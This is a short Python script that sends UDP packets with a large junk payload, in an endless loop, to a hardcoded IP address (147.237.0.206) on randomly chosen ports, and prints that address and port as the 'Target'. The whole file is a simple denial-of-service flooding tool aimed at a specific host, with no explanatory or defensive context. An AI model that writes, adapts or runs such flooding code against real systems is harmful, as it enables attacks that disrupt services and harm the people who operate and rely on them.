import socket
import random

while(True):
	random_ports = [100, 101, 102, 103, 104, 105, 106, 987, 432, 654]

	UDP_IP = "147.237.0.206"
	UDP_PORT = random.choice(random_ports)
	MESSAGE = b"9999-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw99-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw999-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw99999999-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw9999999999999990-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw-=0-=0-=/0-*=0-/=-0*=/-0*=/-0*/*/809-*890/*56/7*8/5*467/*2/4*1/24*12/4*r/weq/rewtge*/wtwetw/wtwetwetttttttttttttt64634634"

	print("Target IP: " + UDP_IP)
	print("Target Port: " + str(UDP_PORT))

	sock = socket.socket(socket.AF_INET,
				socket.SOCK_DGRAM)
	sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
